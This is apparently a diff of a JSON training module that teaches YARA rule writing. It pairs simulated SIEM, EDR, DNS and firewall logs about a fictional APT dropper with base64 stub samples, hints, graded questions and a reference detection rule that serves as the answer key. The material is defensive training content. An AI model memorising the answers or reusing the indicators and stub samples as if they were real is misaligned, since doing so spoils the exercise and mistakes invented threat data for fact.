+          "checkpointType": "MULTIPLE_CHOICE",
+          "question": "Why would malware store strings in wide (UTF-16LE) encoding instead of ASCII?",
+          "options": [
+            "UTF-16LE is faster to process than ASCII",
+            "To evade basic string-scanning tools that only check ASCII",
+            "Windows requires all strings to be UTF-16LE",
+            "Wide strings use less memory than ASCII"
+          ],
+          "correctAnswer": "To evade basic string-scanning tools that only check ASCII",
+          "points": 5,
+          "category": "accuracy",
+          "explanation": "Many basic string-scanning tools (like the 'strings' command) only look for ASCII-encoded strings by default. By storing strings in UTF-16LE (wide) encoding, malware can evade these tools. In UTF-16LE, each ASCII character is followed by a null byte (0x00), breaking ASCII pattern matching. This is why YARA's 'wide' modifier is essential.",
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 5,
+      "title": "Real-World Malware Detection",
+      "description": "Apply all YARA techniques to write a comprehensive detection rule for an APT dropper that combines PE structure checks, string patterns, hex signatures, and behavioral indicators.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Alert — CRITICAL: APT group 'DARKFORGE' campaign detected targeting finance sector. Dropper characteristics: PE file, packed with custom packer (section name '.dfrg'), contains encrypted config, drops payload to %TEMP%, establishes persistence.",
+          "rawLog": {
+            "alertId": "SIEM-2025-0567",
+            "ruleName": "APT Campaign Detection",
+            "severity": "CRITICAL",
+            "timestamp": "2025-06-10T18:00:00Z",
+            "description": "DARKFORGE APT campaign active. Dropper indicators: (1) PE file with '.dfrg' section, (2) String 'DARKFORGE_CFG' marks encrypted config, (3) Uses CreateProcessW for payload execution, (4) Registry persistence, (5) C2 beacon to *.darkforge-cdn.com. Dropper size typically 50-200KB.",
+            "tags": ["APT", "DARKFORGE", "dropper", "finance-sector"],
+            "correlatedEvents": ["EDR-2025-1677", "SIEM-2025-0498"]
+          },
+          "severity": "CRITICAL",
+          "hostname": "SIEM-01",
+          "timestamp": "2025-06-10T18:00:00Z",
+          "isEvidence": true,
+          "evidenceTag": "apt-campaign-alert",
+          "sortOrder": 1
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — CRITICAL: DARKFORGE dropper executed on WS-CFO01. File masquerades as 'AdobeUpdate.exe'. Created child process, wrote to registry Run key, and initiated DNS queries to darkforge-cdn.com.",
+          "rawLog": {
+            "alertId": "EDR-2025-1801",
+            "severity": "CRITICAL",
+            "timestamp": "2025-06-10T18:10:00Z",
+            "hostname": "WS-CFO01",
+            "username": "j.harris",
+            "processName": "AdobeUpdate.exe",
+            "processPath": "C:\\Users\\j.harris\\Downloads\\AdobeUpdate.exe",
+            "parentProcess": "outlook.exe",
+            "alertType": "APT Dropper Execution",
+            "description": "Dropper executed from Downloads folder. Parent: outlook.exe (email attachment). Actions: wrote to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, created child process from %TEMP%, DNS query to update1.darkforge-cdn.com.",
+            "mitreTechnique": "T1547.001"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-CFO01",
+          "username": "j.harris",
+          "processName": "AdobeUpdate.exe",
+          "timestamp": "2025-06-10T18:10:00Z",
+          "isEvidence": true,
+          "evidenceTag": "darkforge-execution",
+          "sortOrder": 2
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Query — WS-CFO01 resolved update1.darkforge-cdn.com to 198.18.0.99. This domain matches the DARKFORGE C2 infrastructure pattern.",
+          "rawLog": {
+            "queryName": "update1.darkforge-cdn.com",
+            "queryType": "A",
+            "responseCode": "NOERROR",
+            "responseData": "198.18.0.99",
+            "sourceIp": "10.0.3.50",
+            "timestamp": "2025-06-10T18:10:15Z",
+            "hostname": "WS-CFO01"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-CFO01",
+          "sourceIp": "10.0.3.50",
+          "destIp": "198.18.0.99",
+          "timestamp": "2025-06-10T18:10:15Z",
+          "isEvidence": true,
+          "evidenceTag": "c2-dns-query",
+          "sortOrder": 3
+        },
+        {
+          "logType": "FIREWALL",
+          "summary": "Firewall — ALLOW: WS-CFO01 (10.0.3.50) connected to 198.18.0.99:443. This matches DARKFORGE C2 infrastructure.",
+          "rawLog": {
+            "action": "ALLOW",
+            "direction": "outbound",
+            "srcIp": "10.0.3.50",
+            "srcPort": 51234,
+            "dstIp": "198.18.0.99",
+            "dstPort": 443,
+            "protocol": "TCP",
+            "bytesOut": 856,
+            "bytesIn": 12045,
+            "timestamp": "2025-06-10T18:10:20Z"
+          },
+          "severity": "CRITICAL",
+          "hostname": "FW-01",
+          "sourceIp": "10.0.3.50",
+          "destIp": "198.18.0.99",
+          "timestamp": "2025-06-10T18:10:20Z",
+          "isEvidence": true,
+          "evidenceTag": "c2-connection",
+          "sortOrder": 4
+        }
+      ],
+      "hints": [
+        {
+          "content": "Combine multiple techniques: (1) Check for MZ header with uint16(0) == 0x5A4D, (2) Match the config marker 'DARKFORGE_CFG', (3) Match the C2 domain pattern with regex, (4) Use filesize constraint. Require the PE check plus at least 2 string indicators.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "Try: uint16(0) == 0x5A4D and filesize < 200KB and ($config and 1 of ($c2*)) where $config = \"DARKFORGE_CFG\" and $c2_domain = /darkforge-cdn\\.com/ and $c2_section = \".dfrg\"",
+          "pointsPenalty": 5,
+          "sortOrder": 2
+        }
+      ],
+      "checkpoints": [
+        {
+          "checkpointType": "YARA_RULE",
+          "question": "Write a comprehensive YARA rule to detect the DARKFORGE APT dropper. Use ALL the techniques you've learned: PE header check (uint16(0) == 0x5A4D), hex/string patterns for 'DARKFORGE_CFG' config marker and '.dfrg' section name, regex for the C2 domain pattern (darkforge-cdn.com), and a filesize constraint (< 200KB). Your rule should match both dropper variants but NOT the legitimate files.",
+          "options": null,
+          "correctAnswer": {
+            "samples": [
+              {
+                "name": "darkforge_dropper_v1.exe",
+                "content": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAQAAAALmRmcmcAAAAAAAAARARLRk9SR0VfQ0ZHAAAAAABDcmVhdGVQcm9jZXNzVwAAAHVwZGF0ZTEuZGFya2ZvcmdlLWNkbi5jb20AAABTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4=",
+                "shouldMatch": true,
+                "description": "DARKFORGE dropper v1: PE file with .dfrg section, DARKFORGE_CFG marker, CreateProcessW API, C2 domain update1.darkforge-cdn.com, and registry persistence.",
+                "previewStrings": ["DARKFORGE_CFG", ".dfrg", "CreateProcessW", "darkforge-cdn.com", "CurrentVersion\\Run"],
+                "previewHex": "4D 5A 90 00 ... 2E 64 66 72 67"
+              },
+              {
+                "name": "darkforge_dropper_v2.exe",
+                "content": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAQAAAALmRmcmcAAAAAREFSS0ZPUkdFX0NGRwAAAABDcmVhdGVQcm9jZXNzVwAAAGJlYWNvbjMuZGFya2ZvcmdlLWNkbi5jb20=",
+                "shouldMatch": true,
+                "description": "DARKFORGE dropper v2: Similar structure, different C2 subdomain (beacon3.darkforge-cdn.com).",
+                "previewStrings": ["DARKFORGE_CFG", ".dfrg", "CreateProcessW", "beacon3.darkforge-cdn.com"],
+                "previewHex": "4D 5A 90 00 ... 2E 64 66 72 67"
+              },
+              {
+                "name": "AdobeUpdate_legit.exe",
+                "content": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAQAAAAQWRvYmUgVXBkYXRlIFNlcnZpY2UgdjIuMC4xAENvcHlyaWdodCAyMDI0IEFkb2JlIEluYy4AaHR0cHM6Ly91cGRhdGUuYWRvYmUuY29tL2NoZWNr",
+                "shouldMatch": false,
+                "description": "Legitimate Adobe Update Service binary. PE file but no DARKFORGE indicators.",
+                "previewStrings": ["Adobe Update Service v2.0.1", "Copyright 2024 Adobe Inc.", "update.adobe.com"]
+              },
+              {
+                "name": "quarterly_report.docx",
+                "content": "UEsDBBQAAAAIAGFpVlkAAAAAAAAAAAAAAAARAAAAcXVhcnRlcmx5X3JlcG9ydC54bWw8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/Pg0KPHJlcG9ydD4NCiAgPHRpdGxlPlExIEZpbmFuY2lhbCBSZXBvcnQ8L3RpdGxlPg0KPC9yZXBvcnQ+",
+                "shouldMatch": false,
+                "description": "Office document (ZIP/DOCX format) — not a PE file. Should not trigger PE-based rules.",
+                "previewStrings": ["quarterly_report.xml", "Q1 Financial Report"],
+                "previewHex": "50 4B 03 04 ..."
+              }
+            ],
+            "referenceRule": "rule DARKFORGE_APT_Dropper {\n    meta:\n        author = \"SOC Team\"\n        description = \"Detects DARKFORGE APT dropper\"\n        threat_group = \"DARKFORGE\"\n    strings:\n        $config = \"DARKFORGE_CFG\"\n        $section = \".dfrg\"\n        $c2 = /darkforge-cdn\\.com/\n        $api = \"CreateProcessW\"\n        $persist = \"CurrentVersion\\\\Run\"\n    condition:\n        uint16(0) == 0x5A4D and\n        filesize < 200KB and\n        $config and\n        1 of ($section, $c2, $api, $persist)\n}"
+          },
+          "points": 25,
+          "category": "accuracy",
+          "explanation": "This comprehensive rule combines: (1) PE header validation with uint16(0) == 0x5A4D to only scan executables, (2) filesize < 200KB to match the known dropper size range, (3) the unique DARKFORGE_CFG config marker as a required match, and (4) at least one additional indicator from the section name, C2 domain, API call, or persistence mechanism. This layered approach minimizes false positives while catching variants.",
+          "sortOrder": 1
+        },
+        {
+          "checkpointType": "MULTIPLE_CHOICE",
+          "question": "You're writing a YARA rule for production deployment across 10,000 endpoints. Which approach best balances detection accuracy with performance?",
+          "options": [
+            "Use only regex patterns for maximum flexibility",
+            "Combine a fast pre-filter (like uint16(0) == 0x5A4D and filesize) with specific string matches",
+            "Match on a single unique string for simplicity",
+            "Use 'all of them' to require every indicator"
+          ],
+          "correctAnswer": "Combine a fast pre-filter (like uint16(0) == 0x5A4D and filesize) with specific string matches",
+          "points": 5,
+          "category": "accuracy",
+          "explanation": "In production, YARA performance matters. Putting fast checks first (file magic bytes, filesize) lets YARA skip non-matching files immediately without scanning their contents. Then specific string matches provide accuracy. Pure regex is slow at scale. A single string is fragile. Requiring ALL indicators misses variants.",
+          "sortOrder": 2
+        }
+      ]
+    }
+  ]
+}
